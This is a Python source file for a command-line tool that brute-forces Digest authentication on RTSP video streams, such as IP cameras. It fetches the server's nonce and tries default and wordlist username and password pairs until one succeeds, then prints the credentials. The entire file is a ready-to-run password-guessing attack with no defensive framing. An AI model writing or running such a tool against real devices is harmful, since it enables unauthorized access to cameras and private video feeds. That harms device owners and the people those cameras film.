import hashlib
import requests
import urllib3
import argparse
import os

urllib3.disable_warnings()

# ---------- DEFAULT CONFIG ----------
DEFAULT_USERNAMES = ["admin", "user", "root"]
DEFAULT_PASSWORDS = ["admin", "1234", "password", "toor", "admin123", "P@ssword"]
RTSP_METHOD = "DESCRIBE"
# ------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("path", help="RTSP path (e.g., live.sdp)")
    parser.add_argument("-p", "--port", type=int, default=554, help="RTSP port (default: 554)")
    parser.add_argument("-U", "--userlist", help="Path to username wordlist")
    parser.add_argument("-P", "--passlist", help="Path to password wordlist")
    return parser.parse_args()

def load_wordlist(path, fallback):
    if path and os.path.isfile(path):
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return fallback

def parse_digest_header(header):
    items = header.replace("Digest ", "").split(",")
    parts = {}
    for item in items:
        if "=" in item:
            k, v = item.strip().split("=", 1)
            parts[k.strip()] = v.strip().strip('"')
    return parts

def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    path = args.path
    url = f"http://{ip}:{port}/{path}"

    usernames = load_wordlist(args.userlist, DEFAULT_USERNAMES)
    passwords = load_wordlist(args.passlist, DEFAULT_PASSWORDS)

    print(f"[*] Target: {url}")
    print("[*] Sending initial request to retrieve digest parameters...")

    r = requests.request(RTSP_METHOD, url, verify=False)
    if r.status_code != 401 or "WWW-Authenticate" not in r.headers:
        print("[-] No Digest challenge received. The path might be wrong or no auth required.")
        return

    auth_params = parse_digest_header(r.headers["WWW-Authenticate"])
    realm = auth_params["realm"]
    nonce = auth_params["nonce"]
    algorithm = auth_params.get("algorithm", "MD5")

    print("[*] Starting brute-force...")
    for username in usernames:
        for password in passwords:
            ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
            ha2 = hashlib.md5(f"{RTSP_METHOD}:/{path}".encode()).hexdigest()
            response_hash = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()

            auth_header = (
                f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
                f'uri="/{path}", response="{response_hash}", algorithm={algorithm}'
            )

            headers = {
                "Authorization": auth_header,
                "CSeq": "1",
            }

            resp = requests.request(RTSP_METHOD, url, headers=headers, verify=False)
            print(f"[*] Tried {username}:{password} - Status {resp.status_code}")

            if resp.status_code == 200:
                print(f"[+] SUCCESS: {username}:{password}")
                return

    print("[-] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    main()
